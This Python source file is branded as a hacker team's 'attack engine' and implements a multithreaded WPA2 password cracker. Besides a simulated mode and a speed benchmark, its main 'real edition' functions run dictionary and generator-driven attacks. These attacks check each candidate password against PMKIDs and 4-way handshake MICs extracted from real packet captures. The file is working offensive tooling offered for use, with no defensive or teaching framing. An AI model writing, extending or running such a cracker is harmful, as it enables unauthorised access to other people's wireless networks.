#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════════╗
║         AWAIS X HACKER TEAM  —  ATTACK ENGINE                ║
║                    engine.py  |  v6.0                        ║
╚══════════════════════════════════════════════════════════════╝
"""

import os
import time
import hmac
import queue
import random
import hashlib
import string
import threading


# ─── WPA2 PMK HASHER ────────────────────────────────────
class Hasher:
    ITERATIONS = 4096
    KEYLEN     = 32

    def __init__(self, ssid):
        self.ssid_bytes = ssid.encode("utf-8")

    def pmk(self, password):
        return hashlib.pbkdf2_hmac(
            "sha1",
            password.encode("utf-8"),
            self.ssid_bytes,
            self.ITERATIONS,
            dklen=self.KEYLEN,
        )


# ─── ATTACK STATE ───────────────────────────────────────
class AttackState:
    def __init__(self):
        self.lock     = threading.Lock()
        self.attempts = 0
        self.found    = None
        self.stop     = threading.Event()
        self.start    = 0.0


# ─── WORKER ─────────────────────────────────────────────
def _worker(hasher, target_mic, q, st, timeout):
    while not st.stop.is_set():
        # timeout check first so workers exit promptly on time limit
        if time.time() - st.start > timeout:
            st.stop.set()
            return
        try:
            pwd = q.get(timeout=0.25)
        except queue.Empty:
            return
        if pwd is None:                      # sentinel → no more work
            return
        with st.lock:
            st.attempts += 1
        try:
            pmk = hasher.pmk(pwd)
            mic = hmac.new(pmk, b"AWAIS-TEST-PACKET",
                           hashlib.sha1).digest()[:16]
        except Exception:
            continue
        if hmac.compare_digest(mic, target_mic):
            with st.lock:
                if st.found is None:
                    st.found = pwd
            st.stop.set()
            return


# ─── PRODUCER ───────────────────────────────────────────
def _producer(path, q, st, num_workers):
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                if st.stop.is_set():
                    return
                w = line.strip()
                if w:
                    try:
                        q.put(w, timeout=1.0)
                    except queue.Full:
                        continue
    except OSError:
        pass
    finally:
        # one sentinel PER WORKER (bug fix: was hardcoded 128)
        for _ in range(num_workers):
            while True:
                try:
                    q.put(None, timeout=0.5)
                    break
                except queue.Full:
                    if st.stop.is_set():
                        return


# ─── SIMULATION ─────────────────────────────────────────
def run_simulation(ssid, target_mic, wordlist_path, threads, timeout,
                   progress_cb=None):
    """
    Simulated WPA2 attack against a known MIC.
    progress_cb(attempts, elapsed, rate) is called ~6 times/sec.
    Returns (AttackState, elapsed_seconds).
    """
    threads = max(1, min(int(threads), 256))
    hasher  = Hasher(ssid)
    st      = AttackState()
    st.start = time.time()
    q       = queue.Queue(maxsize=100000)

    pt = threading.Thread(target=_producer,
                          args=(wordlist_path, q, st, threads),
                          daemon=True)
    pt.start()

    workers = [
        threading.Thread(target=_worker,
                         args=(hasher, target_mic, q, st, timeout),
                         daemon=True)
        for _ in range(threads)
    ]
    for w in workers:
        w.start()

    try:
        while any(w.is_alive() for w in workers):
            elapsed = time.time() - st.start
            if elapsed > timeout:
                st.stop.set()
                break
            rate = st.attempts / elapsed if elapsed > 0 else 0
            if progress_cb:
                progress_cb(st.attempts, elapsed, rate)
            time.sleep(0.15)
    except KeyboardInterrupt:
        st.stop.set()
        raise

    for w in workers:
        w.join(timeout=1.0)

    elapsed = max(time.time() - st.start, 1e-9)
    return st, elapsed


# ─── TARGET MIC ─────────────────────────────────────────
def make_target_mic(ssid, password):
    h   = Hasher(ssid)
    pmk = h.pmk(password)
    return hmac.new(pmk, b"AWAIS-TEST-PACKET", hashlib.sha1).digest()[:16]


# ─── ENGINE BENCHMARK (NEW v6.0) ────────────────────────
def benchmark(ssid="BenchmarkNetwork", seconds=3.0):
    """
    Measure raw PMK/s derivation rate of this machine.
    Returns (attempts, elapsed, rate_per_sec).
    """
    hasher = Hasher(ssid)
    chars  = string.ascii_lowercase + string.digits
    stop   = threading.Event()
    count  = [0]
    lock   = threading.Lock()
    ncpu   = max(1, min(32, (os.cpu_count() or 4)))

    def _bench_worker():
        local = 0
        while not stop.is_set():
            pwd = "".join(random.choices(chars, k=8))
            hasher.pmk(pwd)          # derive & discard
            local += 1
        with lock:
            count[0] += local

    threads = [threading.Thread(target=_bench_worker, daemon=True)
               for _ in range(ncpu)]
    start = time.time()
    for t in threads:
        t.start()
    time.sleep(max(0.5, seconds))
    stop.set()
    for t in threads:
        t.join(timeout=2.0)
    elapsed = time.time() - start
    rate = count[0] / elapsed if elapsed > 0 else 0
    return count[0], elapsed, rate


# ═══ REAL WPA2 CRACKING (v6.1 REAL EDITION) ═════════════
from handshake import pmk_from_password, derive_ptk, mic_from_ptk, \
    pmkid_from_pmk


def _real_worker(info, ssid, q, st, timeout):
    """Worker for REAL attacks: PBKDF2 + PTK + EAPOL-MIC per password."""
    while not st.stop.is_set():
        if time.time() - st.start > timeout:
            st.stop.set()
            return
        try:
            pwd = q.get(timeout=0.25)
        except queue.Empty:
            return
        if pwd is None:
            return
        with st.lock:
            st.attempts += 1
        try:
            pmk = pmk_from_password(pwd, ssid)
            # PMKID targets (cheap check)
            for p in info["pmkids"]:
                if hmac.compare_digest(
                        pmkid_from_pmk(pmk, p["aa"], p["spa"]),
                        p["pmkid"]):
                    with st.lock:
                        if st.found is None:
                            st.found = pwd
                    st.stop.set()
                    return
            # 4-way handshake targets (PTK + MIC)
            for h in info["handshakes"]:
                ptk = derive_ptk(pmk, h["aa"], h["sa"],
                                 h["anonce"], h["snonce"])
                calc = mic_from_ptk(ptk, h["frame"], h["algo"])
                if hmac.compare_digest(calc, h["mic"]):
                    with st.lock:
                        if st.found is None:
                            st.found = pwd
                    st.stop.set()
                    return
        except Exception:
            continue


def run_real_crack(info, ssid, wordlist_path, threads, timeout,
                   progress_cb=None):
    """
    REAL WPA2 dictionary attack (pure Python — no external tools).
    Tests every wordlist word against PMKIDs and 4-way handshakes
    extracted from a real capture file.
    Returns (AttackState, elapsed_seconds).
    """
    threads = max(1, min(int(threads), 256))
    st = AttackState()
    st.start = time.time()
    q = queue.Queue(maxsize=100000)

    pt = threading.Thread(target=_producer,
                          args=(wordlist_path, q, st, threads),
                          daemon=True)
    pt.start()

    workers = [
        threading.Thread(target=_real_worker,
                         args=(info, ssid, q, st, timeout),
                         daemon=True)
        for _ in range(threads)
    ]
    for w in workers:
        w.start()

    try:
        while any(w.is_alive() for w in workers):
            elapsed = time.time() - st.start
            if elapsed > timeout:
                st.stop.set()
                break
            rate = st.attempts / elapsed if elapsed > 0 else 0
            if progress_cb:
                progress_cb(st.attempts, elapsed, rate)
            time.sleep(0.15)
    except KeyboardInterrupt:
        st.stop.set()
        raise

    for w in workers:
        w.join(timeout=1.0)

    elapsed = max(time.time() - st.start, 1e-9)
    return st, elapsed


# ═══ GENERIC ITERATOR ATTACK (v6.2) ═════════════════════
def _iter_producer(make_iter, q, st, num_workers, skip=0, on_offset=None):
    try:
        idx = 0
        for cand in make_iter():
            if st.stop.is_set():
                return
            if idx < skip:
                idx += 1
                continue
            if cand:
                try:
                    q.put(cand, timeout=1.0)
                except queue.Full:
                    pass
            idx += 1
            if on_offset and idx % 2000 == 0:
                on_offset(idx)
    except Exception:
        pass
    finally:
        for _ in range(num_workers):
            while not st.stop.is_set():
                try:
                    q.put(None, timeout=0.5)
                    break
                except queue.Full:
                    pass


def run_iterator_attack(ssid, info, make_iter, threads, timeout,
                        progress_cb=None, skip=0, on_offset=None):
    """Generic REAL attack: any candidate iterator + WPA2 verification."""
    threads = max(1, min(int(threads), 256))
    st = AttackState()
    st.start = time.time()
    q = queue.Queue(maxsize=100000)
    pt = threading.Thread(target=_iter_producer,
                          args=(make_iter, q, st, threads, skip, on_offset),
                          daemon=True)
    pt.start()
    workers = [
        threading.Thread(target=_real_worker,
                         args=(info, ssid, q, st, timeout), daemon=True)
        for _ in range(threads)
    ]
    for w in workers:
        w.start()
    try:
        while any(w.is_alive() for w in workers):
            elapsed = time.time() - st.start
            if elapsed > timeout:
                st.stop.set()
                break
            rate = st.attempts / elapsed if elapsed > 0 else 0
            if progress_cb:
                progress_cb(st.attempts, elapsed, rate)
            time.sleep(0.15)
    except KeyboardInterrupt:
        st.stop.set()
        raise
    for w in workers:
        w.join(timeout=1.0)
    return st, max(time.time() - st.start, 1e-9)
